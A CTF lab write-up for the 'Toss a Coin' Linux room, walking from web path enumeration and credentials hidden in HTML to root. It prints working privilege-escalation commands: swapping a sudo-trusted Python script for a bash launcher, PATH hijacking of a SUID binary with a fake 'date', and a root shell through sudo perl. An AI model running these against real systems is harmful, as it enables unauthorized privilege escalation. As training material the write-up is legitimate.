---
type: writeup
platform: Exegol
room: Toss a Coin
os: Linux
environment: Web Application / Linux Privilege Escalation

techniques:
  - web-enumeration
  - recursive-path-discovery
  - credential-disclosure
  - ssh-access
  - sudo-abuse
  - writable-directory
  - script-replacement
  - suid-enumeration
  - binary-analysis
  - path-hijacking
  - interpreter-abuse

tools:
  - nmap
  - gobuster
  - curl
  - ssh
  - sudo
  - strings
  - perl
---
**Attack path:** Recursive web enumeration → exposed `jaskier` credentials → SSH → sudo-controlled Python script → `yen` → SUID `portal` PATH hijacking → `geralt` → sudo Perl → root

## 1. Reconnaissance

Initial service enumeration:

```bash
sudo nmap -sV -sC <TARGET_IP>
```

Relevant results:

```bash
22/tcp open  ssh
80/tcp open  http
```

A full TCP scan confirmed that no additional services were exposed:

```bash
sudo nmap -p- -T4 <TARGET_IP>
```

With only SSH and HTTP available and no credentials yet, the web application became the initial attack surface.

---

## 2. Web Content Discovery

Initial directory enumeration was performed with:

```bash
gobuster dir \
  -u http://<TARGET_IP>/ \
  -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```

Relevant results:

```bash
/img
/index.html
/t
```

The image directory contained:

```bash
jaskier.jpg
jaskier2.jpg
```

The `/t/` directory displayed:

```bash
"Do you know the lyrics? this one is pretty famous!"
```

The wording suggested that the path itself might represent lyrics.

Enumeration therefore continued recursively.

---

## 3. Character-by-Character Path Discovery

Enumerating `/t/` produced:

```bash
/o
```

Enumerating the resulting path produced:

```bash
/s
```

and continuing revealed:

```bash
/t/o/s/s/
```

The directory structure was effectively encoding text one character at a time.

Using a full web-content wordlist for every position was unnecessary, so a minimal character list was created:

```bash
printf '%s\n' {a..z} _ > chars.txt
```

The underscore represented spaces inside the encoded phrase.

An example request path was:

```bash
gobuster dir \
  -u http://<TARGET_IP>/t/o/s/s/_/a/ \
  -w chars.txt
```

Because manually repeating this process was inefficient, the traversal was automated.

The preserved script was:

```bash
#!/bin/bash

url="http://<TARGET_IP>/t/o/s/s/_/a/_/c/o/i/n/_"

while true; do
    found=""

    for c in {a..z} _; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$c/")

        if [[ "$code" == "200" || "$code" == "301" ]]; then
            echo "[+] $c  ->  $url/$c/"
            found="$c"
            url="$url/$c"
            break
        fi
    done

    if [[ -z "$found" ]]; then
        echo "[!] No next character found."
        echo "[*] Final path: $url/"
        break
    fi
done
```

It was made executable and run with:

```bash
chmod +x follow.sh
./follow.sh
```

The resulting path encoded:

```bash
toss a coin to your witcher oh valley of plenty
```

and ended at:

```bash
/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```

---

## 4. Credential Disclosure in HTML

The final page was retrieved directly:

```bash
curl -i \
  'http://<TARGET_IP>/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/'
```

Its HTML contained a visually hidden element:

```html
<p style="display: none;">jaskier:<REDACTED></p>
```

The CSS property:

```css
display: none;
```

only prevented the element from being rendered visibly. It did not remove the information from the HTML returned to the client.

This disclosed:

```bash
Username: jaskier
Password: <REDACTED>
```

SSH was already exposed on port `22`, so the credentials were tested there.

---

## 5. SSH Access as `jaskier`

Authentication was attempted with:

```bash
ssh jaskier@<TARGET_IP>
```

The recovered password was accepted.

The home directory contained:

```bash
toss-a-coin.py
user.txt
```

The user flag was readable from:

```bash
/home/jaskier/user.txt
```

The preserved notes do not include its value, so it is not reproduced here.

The Python script became more interesting during privilege enumeration.

---

## 6. Sudo Rule for `toss-a-coin.py`

The home directory permissions showed:

```bash
-rw-r--r-- 1 root    root    toss-a-coin.py
-r--r--r-- 1 jaskier jaskier user.txt
```

The Python script itself was owned by `root`, so `jaskier` could not directly modify its contents.

Sudo privileges were then checked:

```bash
sudo -l
```

Relevant rule:

```bash
User jaskier may run:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

This allowed the exact script path to be executed under the `yen` account.

The file itself was protected, but that was not sufficient to protect the privileged execution path.

---

## 7. Writable Parent Directory → Script Replacement

The parent directory belonged to `jaskier`:

```bash
drwxr-xr-x jaskier jaskier /home/jaskier
```

On Unix-like systems, replacing a directory entry depends primarily on permissions on the **parent directory**, not on write permission to the existing file.

Although `jaskier` could not edit the root-owned script in place, the user could rename it:

```bash
mv toss-a-coin.py toss-a-coin.py.bak
```

and create a new attacker-controlled file at the same authorized path.

A replacement script was created:

```bash
printf 'import os\nos.system("/bin/bash")\n' > toss-a-coin.py
```

Resulting Python code:

```python
import os
os.system("/bin/bash")
```

The exact sudo-authorized command was then executed:

```bash
sudo -u yen \
  /usr/bin/python3 \
  /home/jaskier/toss-a-coin.py
```

Because the Python process ran as `yen`, the shell launched by the replacement script inherited that identity.

Verification:

```bash
whoami
id
```

Result:

```bash
yen
uid=1002(yen)
```

This confirmed the first local privilege transition:

```text
jaskier controls the parent directory
        +
sudo trusts a fixed script pathname
        ↓
script at that pathname is replaced
        ↓
attacker-controlled Python runs as yen
```

---

## 8. Discovering the `portal` Binary

Enumeration from the `yen` context revealed:

```bash
/home/yen/portal
```

with permissions:

```bash
-rwsr-sr-x 1 root root portal
```

The custom binary had SUID and SGID bits set and was owned by `root`, making it worth analysing.

Readable strings were inspected:

```bash
strings /home/yen/portal
```

Interesting entries included:

```bash
setuid
setgid
system
I am preparing a portal for you Geralt.
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
```

The command string used an absolute path for:

```bash
/bin/echo
```

but invoked:

```bash
date
```

without one.

This suggested that command resolution might depend on the caller-controlled `PATH`.

---

## 9. Testing the PATH Hijacking Hypothesis

When a shell executes a command without an absolute path, it searches directories listed in:

```bash
PATH
```

An attacker-controlled replacement for `date` was therefore created:

```bash
mkdir -p /tmp/ybin
```

```bash
printf '#!/bin/sh\n/bin/bash -p\n' > /tmp/ybin/date
```

The fake command was made executable:

```bash
chmod +x /tmp/ybin/date
```

The custom directory was then placed first in `PATH` before executing `portal`:

```bash
PATH=/tmp/ybin:$PATH /home/yen/portal
```

When `portal` reached its unqualified `date` command, the shell resolved it to:

```bash
/tmp/ybin/date
```

instead of the legitimate system binary.

The payload launched a shell.

---

## 10. `yen` → `geralt`

The resulting shell identity was checked:

```bash
id
```

Result:

```bash
uid=1003(geralt) gid=1002(yen)
```

The execution context had therefore transitioned to:

```bash
geralt
```

The preserved binary strings included `setuid` and `setgid`, and the runtime result showed that `portal` changed identity before reaching the hijacked external command.

The demonstrated privilege chain was:

```text
yen
   ↓
execute custom SUID portal
   ↓
portal reaches unqualified "date"
   ↓
attacker-controlled PATH resolves /tmp/ybin/date
   ↓
payload executes in portal's current identity
   ↓
geralt
```

The important finding was not simply that `portal` was SUID; exploitation depended on its privileged logic reaching `system()` with an external command resolved through attacker-controlled `PATH`.

---

## 11. Sudo Enumeration as `geralt`

Sudo privileges were checked in the new context:

```bash
sudo -l
```

Relevant result:

```bash
User geralt may run:
    (root) NOPASSWD: /usr/bin/perl
```

This permitted unrestricted Perl execution as root without a password.

Because Perl can execute arbitrary operating-system commands, this rule was effectively a direct path to root command execution.

---

## 12. `geralt` → Root Through Perl

Perl was used to replace itself with a privileged Bash process:

```bash
sudo /usr/bin/perl \
  -e 'exec "/bin/bash", "-p";'
```

The resulting context was verified:

```bash
id
whoami
```

Result:

```bash
uid=0(root) gid=0(root)
root
```

Root access was achieved.

The final flag was read from:

```bash
/root/root.txt
```

```bash
EPI{REDACTED}
```

---

## Key Takeaways

- Web content can encode information through directory structure itself; here the attack path required following a phrase one character at a time.
- Automating repetitive enumeration is preferable once the underlying discovery pattern is understood.
- `display: none` is a presentation control, not a security control; hidden HTML remains fully accessible to the client.
- Protecting a privileged script requires protecting both the file and the directory entry that points to it. A non-writable file can still be replaced when its parent directory is writable.
- Sudo rules that trust a fixed pathname can be exploitable when a lower-privileged user can replace the file at that path.
- A SUID binary should be analysed for both privilege transitions and unsafe external command execution.
- Calling an executable without an absolute path from a privileged process can allow PATH hijacking when the environment remains attacker-controllable.
- Privilege assumptions should be verified at runtime: the hijacked `portal` command executed as `geralt`, not directly as root.
- Allowing an unrestricted interpreter such as Perl through passwordless sudo effectively grants arbitrary root code execution.